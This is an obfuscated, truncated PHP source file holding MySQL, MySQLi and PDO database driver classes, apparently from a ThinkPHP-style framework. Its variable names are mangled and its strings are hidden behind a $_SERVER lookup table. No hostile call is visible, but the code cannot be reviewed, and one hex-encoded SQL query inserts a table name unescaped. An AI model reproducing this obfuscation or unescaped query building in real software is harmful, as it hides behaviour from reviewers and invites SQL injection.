<?php
 goto cšâ´í±; fÉè‘£ñæŒ: class DbMysql extends Db { public function __construct($è¤‡‘ú­ = '') { $€­€­Ş =& $_SERVER[÷ôÚîå]; if (!extension_loaded($€­€­Ş[894])) { think_exception(think_lang($€­€­Ş[14]) . $€­€­Ş[974]); } if (!empty($è¤‡‘ú­)) { $this->config = $è¤‡‘ú­; if (empty($this->config[$€­€­Ş[17]])) { $this->config[$€­€­Ş[17]] = $€­€­Ş[12]; } } } public function connect($°ä·åú = '', $Óå½Ê‹¬ = 0, $êîßëÓ = false) { $‡…õ¿æ =& $_SERVER[÷ôÚîå]; if (!isset($this->linkID[$Óå½Ê‹¬])) { if (empty($°ä·åú)) { $°ä·åú = $this->config; } $îóÍ”ñ– = $°ä·åú[$‡…õ¿æ[975]] . ($°ä·åú[$‡…õ¿æ[976]] ? "\x3a{$°ä·åú[$‡…õ¿æ[976]]}" : $‡…õ¿æ[12]); $§­ş£ª† = !empty($°ä·åú[$‡…õ¿æ[17]][$‡…õ¿æ[18]]) ? $°ä·åú[$‡…õ¿æ[17]][$‡…õ¿æ[18]] : $this->pconnect; if ($§­ş£ª†) { $this->linkID[$Óå½Ê‹¬] = mysql_pconnect($îóÍ”ñ–, $°ä·åú[$‡…õ¿æ[977]], $°ä·åú[$‡…õ¿æ[978]], 131072); } else { $this->linkID[$Óå½Ê‹¬] = mysql_connect($îóÍ”ñ–, $°ä·åú[$‡…õ¿æ[977]], $°ä·åú[$‡…õ¿æ[978]], !0, 131072); } if (!$this->linkID[$Óå½Ê‹¬] || !empty($°ä·åú[$‡…õ¿æ[21]]) && !mysql_select_db($°ä·åú[$‡…õ¿æ[21]], $this->linkID[$Óå½Ê‹¬])) { think_exception(mysql_error()); } $„ƒò³ˆš = mysql_get_server_info($this->linkID[$Óå½Ê‹¬]); mysql_query($‡…õ¿æ[979] . think_config($‡…õ¿æ[980]) . $‡…õ¿æ[58], $this->linkID[$Óå½Ê‹¬]); if ($„ƒò³ˆš > $‡…õ¿æ[981]) { mysql_query($‡…õ¿æ[982], $this->linkID[$Óå½Ê‹¬]); } $this->connected = !0; if (1 != think_config($‡…õ¿æ[22])) { unset($this->config); } } return $this->linkID[$Óå½Ê‹¬]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ºá•²û) { $²ü‹œé =& $_SERVER[÷ôÚîå]; if (0 === stripos($ºá•²û, $²ü‹œé[350])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ºá•²û; if ($this->queryID) { $this->free(); } think_action_status($²ü‹œé[23], 1); think_status($²ü‹œé[24]); $this->queryID = mysql_query($ºá•²û, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($»¢Æ‰‰œ) { $½ï‘Ñ¶¼ =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $»¢Æ‰‰œ; if ($this->queryID) { $this->free(); } think_action_status($½ï‘Ñ¶¼[25], 1); think_status($½ï‘Ñ¶¼[24]); $ıÏÍ˜¬’ = mysql_query($»¢Æ‰‰œ, $this->_linkID); $this->debug(); if (!1 === $ıÏÍ˜¬’) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[÷ôÚîå][983], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¼§­„åà = mysql_query($_SERVER[÷ôÚîå][984], $this->_linkID); $this->transTimes = 0; if (!$¼§­„åà) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‘¥ÙĞì = mysql_query($_SERVER[÷ôÚîå][985], $this->_linkID); $this->transTimes = 0; if (!$‘¥ÙĞì) { $this->error(); return !1; } } return !0; } private function getAll() { $üø’Ò¨¸ = array(); if ($this->numRows > 0) { while ($ù‚–É‰¨ = mysql_fetch_assoc($this->queryID)) { $üø’Ò¨¸[] = $ù‚–É‰¨; } mysql_data_seek($this->queryID, 0); } return $üø’Ò¨¸; } public function getFields($Şı†È˜ë) { $ª¿¡ˆ…Œ =& $_SERVER[÷ôÚîå]; $ˆÚÉ®Ğ = $this->query($ª¿¡ˆ…Œ[986] . $this->parseKey($Şı†È˜ë)); $ã‰Ó©“¨ = array(); if ($ˆÚÉ®Ğ) { foreach ($ˆÚÉ®Ğ as $«½óäˆ => $¤®Ì€á—) { $ã‰Ó©“¨[$¤®Ì€á—[$ª¿¡ˆ…Œ[31]]] = array($ª¿¡ˆ…Œ[32] => $¤®Ì€á—[$ª¿¡ˆ…Œ[31]], $ª¿¡ˆ…Œ[33] => $¤®Ì€á—[$ª¿¡ˆ…Œ[34]], $ª¿¡ˆ…Œ[35] => (bool) (strtoupper($¤®Ì€á—[$ª¿¡ˆ…Œ[36]]) === $ª¿¡ˆ…Œ[987]), $ª¿¡ˆ…Œ[37] => $¤®Ì€á—[$ª¿¡ˆ…Œ[38]], $ª¿¡ˆ…Œ[39] => strtolower($¤®Ì€á—[$ª¿¡ˆ…Œ[40]]) == $ª¿¡ˆ…Œ[41], $ª¿¡ˆ…Œ[42] => strtolower($¤®Ì€á—[$ª¿¡ˆ…Œ[43]]) == $ª¿¡ˆ…Œ[44]); } } return $ã‰Ó©“¨; } public function getTables($ˆªÛ³÷ = '') { $Ùë¾”ÏÙ =& $_SERVER[÷ôÚîå]; if (!empty($ˆªÛ³÷)) { $û¦â´û² = $Ùë¾”ÏÙ[988] . $ˆªÛ³÷ . $Ùë¾”ÏÙ[989]; } else { $û¦â´û² = $Ùë¾”ÏÙ[990]; } $Å½¶İæ¥ = $this->query($û¦â´û²); $‚¤‡íØí = array(); foreach ($Å½¶İæ¥ as $…ø¸¶ğ => $„•ñÍ–ç) { $‚¤‡íØí[$…ø¸¶ğ] = current($„•ñÍ–ç); } return $‚¤‡íØí; } public function replace($èÛçéŒ¼, $İ¼×„— = array()) { $ÔÏŞíÂ­ =& $_SERVER[÷ôÚîå]; foreach ($èÛçéŒ¼ as $Õ«´œˆ => $Ö‡ÈšÈ) { $¿üÎÖ¢ = $this->parseValue($Ö‡ÈšÈ); if (is_scalar($¿üÎÖ¢)) { $€ õÛ»¾[] = $¿üÎÖ¢; $¢Ó”ÉÚ[] = $this->parseKey($Õ«´œˆ); } } $ˆÒÌù¢ë = $ÔÏŞíÂ­[991] . $this->parseTable($İ¼×„—[$ÔÏŞíÂ­[365]]) . $ÔÏŞíÂ­[992] . implode($ÔÏŞíÂ­[50], $¢Ó”ÉÚ) . $ÔÏŞíÂ­[993] . implode($ÔÏŞíÂ­[50], $€ õÛ»¾) . $ÔÏŞíÂ­[994]; return $this->execute($ˆÒÌù¢ë); } public function insertAll($éé»…áò, $µ‡Î¿ŸÓ = array(), $µäğõí× = false) { $æàºåš =& $_SERVER[÷ôÚîå]; if (!is_array($éé»…áò[0])) { return !1; } $€ô­ªÕ» = array_keys($éé»…áò[0]); $šçÓáÇˆ = array(); foreach ($éé»…áò as $å‰öº€) { $¡ûŠÙ½Š = array(); foreach ($å‰öº€ as $®‘ƒÊƒ­ => $ÜÁÈ¹Û‰) { $ÜÁÈ¹Û‰ = $this->parseValue($ÜÁÈ¹Û‰); if (is_scalar($ÜÁÈ¹Û‰)) { $¡ûŠÙ½Š[] = $ÜÁÈ¹Û‰; } } $šçÓáÇˆ[] = $æàºåš[346] . implode($æàºåš[50], $¡ûŠÙ½Š) . $æàºåš[994]; } array_walk($€ô­ªÕ», array($this, $æàºåš[995])); $ÔÊİÚö = ($µäğõí× ? $æàºåš[996] : $æàºåš[997]) . $æàºåš[998] . $this->parseTable($µ‡Î¿ŸÓ[$æàºåš[365]]) . $æàºåš[992] . implode($æàºåš[50], $€ô­ªÕ») . $æàºåš[999] . implode($æàºåš[50], $šçÓáÇˆ); return $this->execute($ÔÊİÚö); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‰Ü‘Ê©° =& $_SERVER[÷ôÚîå]; $this->error = mysql_errno() . $‰Ü‘Ê©°[4] . mysql_error($this->_linkID); if ($‰Ü‘Ê©°[12] != $this->queryStr) { $this->error .= LNG($‰Ü‘Ê©°[48]) . $this->queryStr; } think_trace($this->error, $‰Ü‘Ê©°[12], $‰Ü‘Ê©°[49]); return $this->error; } public function escapeString($µ˜–Ìõî) { if ($this->_linkID) { return mysql_real_escape_string($µ˜–Ìõî, $this->_linkID); } else { return mysql_escape_string($µ˜–Ìõî); } } public function parseKey(&$÷Â°Î‘€, $¶éâÁ = true) { $ÃÒšõ× =& $_SERVER[÷ôÚîå]; if ($¶éâÁ) { $÷Â°Î‘€ = $this->parseKeyCheck($÷Â°Î‘€); } if ($÷Â°Î‘€ != $ÃÒšõ×[230] && !preg_match($ÃÒšõ×[1000], $÷Â°Î‘€)) { $÷Â°Î‘€ = $ÃÒšõ×[470] . trim($÷Â°Î‘€, $ÃÒšõ×[470]) . $ÃÒšõ×[470]; } return $÷Â°Î‘€; } } class DbMysqli extends Db { public function __construct($Ç˜Ëø×œ = '') { $Â³Ï©™ =& $_SERVER[÷ôÚîå]; if (!extension_loaded($Â³Ï©™[1001])) { think_exception(think_lang($Â³Ï©™[14]) . $Â³Ï©™[1002]); } if (!empty($Ç˜Ëø×œ)) { $this->config = $Ç˜Ëø×œ; if (empty($this->config[$Â³Ï©™[17]])) { $this->config[$Â³Ï©™[17]] = $Â³Ï©™[12]; } } } public function connect($°³µÚøÍ = '', $¨æÇçÏ = 0) { $¸ä„Í‡÷ =& $_SERVER[÷ôÚîå]; if (!isset($this->linkID[$¨æÇçÏ])) { if (empty($°³µÚøÍ)) { $°³µÚøÍ = $this->config; } $this->linkID[$¨æÇçÏ] = new mysqli($°³µÚøÍ[$¸ä„Í‡÷[975]], $°³µÚøÍ[$¸ä„Í‡÷[977]], $°³µÚøÍ[$¸ä„Í‡÷[978]], $°³µÚøÍ[$¸ä„Í‡÷[21]], $°³µÚøÍ[$¸ä„Í‡÷[976]] ? intval($°³µÚøÍ[$¸ä„Í‡÷[976]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $¼éŸ¥¾• = $this->linkID[$¨æÇçÏ]->server_version; $this->linkID[$¨æÇçÏ]->query($¸ä„Í‡÷[979] . think_config($¸ä„Í‡÷[980]) . $¸ä„Í‡÷[58]); if ($¼éŸ¥¾• > $¸ä„Í‡÷[981]) { $this->linkID[$¨æÇçÏ]->query($¸ä„Í‡÷[982]); } $this->connected = !0; if (1 != think_config($¸ä„Í‡÷[22])) { unset($this->config); } } return $this->linkID[$¨æÇçÏ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($µ¢—Èı) { $¿»¸ª…ƒ =& $_SERVER[÷ôÚîå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $µ¢—Èı; if ($this->queryID) { $this->free(); } think_action_status($¿»¸ª…ƒ[23], 1); think_status($¿»¸ª…ƒ[24]); $this->queryID = $this->_linkID->query($µ¢—Èı); if ($this->_linkID->more_results()) { while (($Ê‚²‹Ö¦ = $this->_linkID->next_result()) != NULL) { $Ê‚²‹Ö¦->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($°â®ÚÔ‡) { $ÜòÍ¨º =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $°â®ÚÔ‡; if ($this->queryID) { $this->free(); } think_action_status($ÜòÍ¨º[25], 1); think_status($ÜòÍ¨º[24]); $Úşïññ = $this->_linkID->query($°â®ÚÔ‡); $this->debug(); if (!1 === $Úşïññ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ôî‹¸ŞÆ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Ôî‹¸ŞÆ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¡ÈØß€ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¡ÈØß€) { $this->error(); return !1; } } return !0; } private function getAll() { $¿À šÖï = array(); if ($this->numRows > 0) { for ($³‹áúºµ = 0; $³‹áúºµ < $this->numRows; $³‹áúºµ++) { $¿À šÖï[$³‹áúºµ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¿À šÖï; } public function getFields($¹Ì²´ªâ) { $íüĞÛ›ë =& $_SERVER[÷ôÚîå]; $©“»øõ = $this->query($íüĞÛ›ë[986] . $this->parseKey($¹Ì²´ªâ)); $§Ô”¼ = array(); if ($©“»øõ) { foreach ($©“»øõ as $â†³‡¨İ => $éŠíÅĞ„) { $§Ô”¼[$éŠíÅĞ„[$íüĞÛ›ë[31]]] = array($íüĞÛ›ë[32] => $éŠíÅĞ„[$íüĞÛ›ë[31]], $íüĞÛ›ë[33] => $éŠíÅĞ„[$íüĞÛ›ë[34]], $íüĞÛ›ë[35] => (bool) ($éŠíÅĞ„[$íüĞÛ›ë[36]] === $íüĞÛ›ë[12]), $íüĞÛ›ë[37] => $éŠíÅĞ„[$íüĞÛ›ë[38]], $íüĞÛ›ë[39] => strtolower($éŠíÅĞ„[$íüĞÛ›ë[40]]) == $íüĞÛ›ë[41], $íüĞÛ›ë[42] => strtolower($éŠíÅĞ„[$íüĞÛ›ë[43]]) == $íüĞÛ›ë[44]); } } return $§Ô”¼; } public function getTables($Ë•æé³½ = '') { $Ó“Ã­ıÓ =& $_SERVER[÷ôÚîå]; $éÖáƒş• = !empty($Ë•æé³½) ? $Ó“Ã­ıÓ[988] . $Ë•æé³½ . $Ó“Ã­ıÓ[989] : $Ó“Ã­ıÓ[990]; $·£–İŠœ = $this->query($éÖáƒş•); $§·„½ÂÖ = array(); if ($·£–İŠœ) { foreach ($·£–İŠœ as $Áü¾îô => $˜úÖò§Ò) { $§·„½ÂÖ[$Áü¾îô] = current($˜úÖò§Ò); } } return $§·„½ÂÖ; } public function replace($É™†·†¶, $Ş³öÚ‹Ô = array()) { $ëØÂÂ¨ =& $_SERVER[÷ôÚîå]; foreach ($É™†·†¶ as $ó¨ó»• => $çËï–Ûó) { $Àá­áŸø = $this->parseValue($çËï–Ûó); if (is_scalar($Àá­áŸø)) { $îËØ¶•[] = $Àá­áŸø; $ò‘â®çø[] = $this->parseKey($ó¨ó»•); } } $àËÇòÜ¢ = $ëØÂÂ¨[991] . $this->parseTable($Ş³öÚ‹Ô[$ëØÂÂ¨[365]]) . $ëØÂÂ¨[992] . implode($ëØÂÂ¨[50], $ò‘â®çø) . $ëØÂÂ¨[993] . implode($ëØÂÂ¨[50], $îËØ¶•) . $ëØÂÂ¨[994]; return $this->execute($àËÇòÜ¢); } public function insertAll($Ûí»õÕ, $¤£¥ñœ = array(), $¾ÒßËÅ¾ = false) { $ê©„­£‚ =& $_SERVER[÷ôÚîå]; if (!is_array($Ûí»õÕ[0])) { return !1; } $¥â¤¨…ı = array_keys($Ûí»õÕ[0]); $¡ºÓ÷– = array(); foreach ($Ûí»õÕ as $Ë½…íöú) { $ôã˜½Ğ = array(); foreach ($Ë½…íöú as $Å»ãê‹’ => $·ÑÕ…àã) { $·ÑÕ…àã = $this->parseValue($·ÑÕ…àã); if (is_scalar($·ÑÕ…àã)) { $ôã˜½Ğ[] = $·ÑÕ…àã; } } $¡ºÓ÷–[] = $ê©„­£‚[346] . implode($ê©„­£‚[50], $ôã˜½Ğ) . $ê©„­£‚[994]; } array_walk($¥â¤¨…ı, array($this, $ê©„­£‚[995])); $‚³àÔèİ = $¾ÒßËÅ¾ ? $ê©„­£‚[996] : $ê©„­£‚[997]; $š¬¸¤äİ = $‚³àÔèİ . $ê©„­£‚[998] . $this->parseTable($¤£¥ñœ[$ê©„­£‚[365]]) . $ê©„­£‚[992] . implode($ê©„­£‚[50], $¥â¤¨…ı) . $ê©„­£‚[999] . implode($ê©„­£‚[50], $¡ºÓ÷–); return $this->execute($š¬¸¤äİ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $õ©Â¥æö =& $_SERVER[÷ôÚîå]; $this->error = $this->_linkID->errno . $õ©Â¥æö[4] . $this->_linkID->error; if ($õ©Â¥æö[12] != $this->queryStr) { $this->error .= LNG($õ©Â¥æö[48]) . $this->queryStr; } think_trace($this->error, $õ©Â¥æö[12], $õ©Â¥æö[49]); return $this->error; } public function escapeString($¬‰Æ÷Éú) { if ($this->_linkID) { return $this->_linkID->real_escape_string($¬‰Æ÷Éú); } else { return addslashes($¬‰Æ÷Éú); } } public function parseKey(&$ŒšÒ”£ë, $ë©‹²ıæ = true) { $¡“¬Ş·„ =& $_SERVER[÷ôÚîå]; if ($ë©‹²ıæ) { $ŒšÒ”£ë = $this->parseKeyCheck($ŒšÒ”£ë); } if ($ŒšÒ”£ë != $¡“¬Ş·„[230] && !preg_match($¡“¬Ş·„[1000], $ŒšÒ”£ë)) { $ŒšÒ”£ë = $¡“¬Ş·„[470] . trim($ŒšÒ”£ë, $¡“¬Ş·„[470]) . $¡“¬Ş·„[470]; } return $ŒšÒ”£ë; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($òªÂß•Û = '') { $§¥¸Šø =& $_SERVER[÷ôÚîå]; if (!class_exists($§¥¸Šø[1003])) { think_exception(think_lang($§¥¸Šø[14]) . $§¥¸Šø[1004]); } if (!empty($òªÂß•Û)) { $this->config = $òªÂß•Û; if (empty($this->config[$§¥¸Šø[17]])) { $this->config[$§¥¸Šø[17]] = array(); } } } public function connect($ÖôÜŒˆå = '', $ŸÕßß³ş = 0) { $œô™¼ûü =& $_SERVER[÷ôÚîå]; if (!isset($this->linkID[$ŸÕßß³ş])) { if (empty($ÖôÜŒˆå)) { $ÖôÜŒˆå = $this->config; } $¼“ÌÅ‡ = !empty($ÖôÜŒˆå[$œô™¼ûü[17]][$œô™¼ûü[18]]) ? $ÖôÜŒˆå[$œô™¼ûü[17]][$œô™¼ûü[18]] : $this->pconnect; if ($¼“ÌÅ‡) { $ÖôÜŒˆå[$œô™¼ûü[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ŸÕßß³ş] = new PDO($ÖôÜŒˆå[$œô™¼ûü[1005]], $ÖôÜŒˆå[$œô™¼ûü[977]], $ÖôÜŒˆå[$œô™¼ûü[978]], $ÖôÜŒˆå[$œô™¼ûü[17]]); } catch (PDOException $ôöáÒñÊ) { think_exception($ôöáÒñÊ->getMessage()); } $this->dbType = $this->_getDsnType($ÖôÜŒˆå[$œô™¼ûü[1005]]); if (in_array($this->dbType, array($œô™¼ûü[1006], $œô™¼ûü[1007], $œô™¼ûü[1008], $œô™¼ûü[1009]))) { think_exception($œô™¼ûü[1010] . $this->dbType . $œô™¼ûü[1011] . $this->dbType . $œô™¼ûü[1012]); } if (!$this->linkID[$ŸÕßß³ş]) { think_exception($œô™¼ûü[1013]); } try { $this->linkID[$ŸÕßß³ş]->exec($œô™¼ûü[1014] . think_config($œô™¼ûü[980])); } catch (Exception $ôöáÒñÊ) { } $this->connected = !0; if (1 != think_config($œô™¼ûü[22])) { unset($this->config); } } return $this->linkID[$ŸÕßß³ş]; } public function free() { $this->PDOStatement = null; } public function query($•Ÿƒ±š÷, $ĞÓ‘Ïô¶ = array()) { $ÆÛÅêúË =& $_SERVER[÷ôÚîå]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•Ÿƒ±š÷; if (!empty($ĞÓ‘Ïô¶)) { $this->queryStr .= $ÆÛÅêúË[1015] . print_r($ĞÓ‘Ïô¶, !0) . $ÆÛÅêúË[1016]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÆÛÅêúË[23], 1); think_status($ÆÛÅêúË[24]); $this->PDOStatement = $this->_linkID->prepare($•Ÿƒ±š÷); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Œé™ò×‚ = $this->PDOStatement->execute($ĞÓ‘Ïô¶); $this->debug(); if (!1 === $Œé™ò×‚) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($È×èåÑ–, $€¨ğ¹™µ = array()) { $Ú·š€Îœ =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $È×èåÑ–; if (!empty($€¨ğ¹™µ)) { $this->queryStr .= $Ú·š€Îœ[1015] . print_r($€¨ğ¹™µ, !0) . $Ú·š€Îœ[1016]; } $ÇŸŞØ¶ = !1; if ($this->dbType == $Ú·š€Îœ[1009]) { if (preg_match($Ú·š€Îœ[1017], $this->queryStr, $©×¨Ú®)) { $this->table = think_config($Ú·š€Îœ[1018]) . str_ireplace(think_config($Ú·š€Îœ[1019]), $Ú·š€Îœ[463], $©×¨Ú®[2]); $ÇŸŞØ¶ = (bool) $this->query($Ú·š€Îœ[1020] . strtoupper($this->table) . $Ú·š€Îœ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ú·š€Îœ[25], 1); think_status($Ú·š€Îœ[24]); $this->PDOStatement = $this->_linkID->prepare($È×èåÑ–); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ñü£âÓ = $this->PDOStatement->execute($€¨ğ¹™µ); $this->debug(); if (!1 === $ñü£âÓ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÇŸŞØ¶ || preg_match($Ú·š€Îœ[1021], $È×èåÑ–)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $üÆ¹èœ½ = $this->_linkID->commit(); $this->transTimes = 0; if (!$üÆ¹èœ½) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $—µ¸ıáå = $this->_linkID->rollback(); $this->transTimes = 0; if (!$—µ¸ıáå) { $this->error(); return !1; } } return !0; } private function getAll() { $Ü­‡ëş = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Ü­‡ëş); return $Ü­‡ëş; } public function getFields($ŞŠÛ¯) { $¹¯±ìë =& $_SERVER[÷ôÚîå]; $this->initConnect(!0); if (think_config($¹¯±ìë[1022])) { $òòŠ†Ä© = str_replace($¹¯±ìë[1023], $ŞŠÛ¯, think_config($¹¯±ìë[1022])); } else { switch ($this->dbType) { case $¹¯±ìë[1006]: case $¹¯±ìë[1024]: $òòŠ†Ä© = "\123\x45\x4c\x45\x43\124\x20\x20\40\x63\x6f\154\165\x6d\x6e\137\x6e\141\155\x65\x20\x61\x73\40\x27\x4e\141\x6d\145\47\54\40\40\x20\x64\x61\164\x61\137\164\x79\160\x65\x20\141\163\40\x27\x54\171\160\145\47\54\x20\x20\40\x63\x6f\x6c\165\x6d\156\x5f\x64\x65\x66\x61\x75\x6c\x74\40\141\x73\40\47\x44\145\x66\x61\x75\154\x74\x27\x2c\40\40\40\x69\163\137\x6e\165\154\154\141\x62\x6c\x65\40\x61\163\x20\47\x4e\x75\x6c\x6c\x27\xa\11\x9\x46\122\x4f\115\x9\151\x6e\146\157\162\x6d\x61\x74\x69\157\156\137\x73\x63\x68\145\155\x61\56\164\141\x62\154\145\x73\x20\101\123\40\164\12\x9\x9\112\x4f\x49\x4e\x9\x69\x6e\x66\157\x72\x6d\x61\x74\x69\x6f\156\137\163\x63\150\x65\155\141\56\x63\x6f\x6c\165\155\156\x73\x20\x41\x53\40\143\xa\11\11\x4f\116\x20\40\x74\56\x74\x61\x62\154\145\x5f\x63\x61\164\141\x6c\x6f\147\x20\75\40\x63\56\x74\141\x62\x6c\145\137\143\x61\x74\x61\x6c\x6f\x67\xa\11\11\x41\116\x44\40\164\56\164\x61\142\x6c\145\x5f\163\143\150\145\155\141\x20\75\x20\x63\56\164\x61\x62\x6c\x65\137\x73\x63\150\x65\x6d\x61\xa\x9\11\101\x4e\104\40\x74\x2e\164\141\x62\154\x65\x5f\156\x61\x6d\x65\x20\x3d\40\x63\56\x74\141\142\x6c\x65\x5f\156\x61\155\x65\xa\x9\11\x57\110\105\122\x45\40\40\x20\x74\x2e\x74\141\142\x6c\145\x5f\x6e\x61\x6d\145\40\x3d\x20\x27{$ŞŠÛ¯}\47"; break; case $¹¯±ìë[1025]: $òòŠ†Ä© = $¹¯±ìë[1026] . $ŞŠÛ¯ . $¹¯±ìë[1027]; break; case $¹¯±ìë[1007]: case $¹¯±ìë[1009]: $òòŠ†Ä© = $¹¯±ìë[1028] . $¹¯±ìë[1029] . $¹¯±ìë[1030] . strtoupper($ŞŠÛ¯) . $¹¯±ìë[1031] . strtoupper($ŞŠÛ¯) . $¹¯±ìë[1032]; break; case $¹¯±ìë[1033]: $òòŠ†Ä© = $¹¯±ìë[1034] . $ŞŠÛ¯ . $¹¯±ìë[1035]; break; case $¹¯±ìë[1008]: break; case $¹¯±ìë[1036]: default: $òòŠ†Ä© = $¹¯±ìë[1037] . ($this->dbType == $¹¯±ìë[1036] ? "\x60{$ŞŠÛ¯}\140" : $ŞŠÛ¯); } } $¢øºÅäê = $this->query($òòŠ†Ä©); $£·¦èö = array(); if ($¢øºÅäê) { foreach ($¢øºÅäê as $ÑíÅğº => $¼š¡Ú¢Ê) { $¼š¡Ú¢Ê = array_change_key_case($¼š¡Ú¢Ê); $¼š¡Ú¢Ê[$¹¯±ìë[32]] = isset($¼š¡Ú¢Ê[$¹¯±ìë[32]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[32]] : $¹¯±ìë[463]; $¼š¡Ú¢Ê[$¹¯±ìë[33]] = isset($¼š¡Ú¢Ê[$¹¯±ìë[33]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[33]] : $¹¯±ìë[463]; $Û¥æšíÓ = isset($¼š¡Ú¢Ê[$¹¯±ìë[359]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[359]] : $¼š¡Ú¢Ê[$¹¯±ìë[32]]; $£·¦èö[$Û¥æšíÓ] = array($¹¯±ìë[32] => $Û¥æšíÓ, $¹¯±ìë[33] => $¼š¡Ú¢Ê[$¹¯±ìë[33]], $¹¯±ìë[35] => (bool) (isset($¼š¡Ú¢Ê[$¹¯±ìë[116]]) && $¼š¡Ú¢Ê[$¹¯±ìë[116]] === $¹¯±ìë[12] || isset($¼š¡Ú¢Ê[$¹¯±ìë[35]]) && $¼š¡Ú¢Ê[$¹¯±ìë[35]] === $¹¯±ìë[12]), $¹¯±ìë[37] => isset($¼š¡Ú¢Ê[$¹¯±ìë[37]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[37]] : (isset($¼š¡Ú¢Ê[$¹¯±ìë[56]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[56]] : $¹¯±ìë[463]), $¹¯±ìë[39] => isset($¼š¡Ú¢Ê[$¹¯±ìë[107]]) ? strtolower($¼š¡Ú¢Ê[$¹¯±ìë[107]]) == $¹¯±ìë[41] : (isset($¼š¡Ú¢Ê[$¹¯±ìë[57]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[57]] : !1), $¹¯±ìë[42] => isset($¼š¡Ú¢Ê[$¹¯±ìë[1038]]) ? strtolower($¼š¡Ú¢Ê[$¹¯±ìë[1038]]) == $¹¯±ìë[44] : (isset($¼š¡Ú¢Ê[$¹¯±ìë[107]]) ? $¼š¡Ú¢Ê[$¹¯±ìë[107]] : !1)); } } return $£·¦èö; } public function getTables($…Õ¸÷˜ö = '') { $ñó¤¯Óó =& $_SERVER[÷ôÚîå]; if (think_config($ñó¤¯Óó[1039])) { $‡àÙÉ± = str_replace($ñó¤¯Óó[1040], $…Õ¸÷˜ö, think_config($ñó¤¯Óó[1039])); } else { switch ($this->dbType) { case $ñó¤¯Óó[1007]: case $ñó¤¯Óó[1009]: $‡àÙÉ± = $ñó¤¯Óó[1041]; break; case $ñó¤¯Óó[1006]: case $ñó¤¯Óó[1024]: $‡àÙÉ± = $ñó¤¯Óó[1042]; break; case $ñó¤¯Óó[1033]: $‡àÙÉ± = $ñó¤¯Óó[1043]; break; case $ñó¤¯Óó[1008]: think_exception(think_lang($ñó¤¯Óó[1044]) . $ñó¤¯Óó[1045]); break; case $ñó¤¯Óó[1025]: $‡àÙÉ± = $ñó¤¯Óó[45] . $ñó¤¯Óó[46] . $ñó¤¯Óó[47]; break; case $ñó¤¯Óó[1036]: default: if (!empty($…Õ¸÷˜ö)) { $‡àÙÉ± = $ñó¤¯Óó[988] . $…Õ¸÷˜ö . $ñó¤¯Óó[989]; } else { $‡àÙÉ± = $ñó¤¯Óó[990]; } } } $ÙÂ÷³³‰ = $this->query($‡àÙÉ±); $Ø¬­Ë² = array(); foreach ($ÙÂ÷³³‰ as $Åèœ‚Ìï => $¥çê•Ë€) { $Ø¬­Ë²[$Åèœ‚Ìï] = current($¥çê•Ë€); } return $Ø¬­Ë²; } protected function parseLimit($–èàåÙ) { $¶¤Ñêá› =& $_SERVER[÷ôÚîå]; $Ñğ¡³êÚ = $¶¤Ñêá›[12]; if (!empty($–èàåÙ)) { switch ($this->dbType) { case $¶¤Ñêá›[1033]: case $¶¤Ñêá›[1025]: $–èàåÙ = 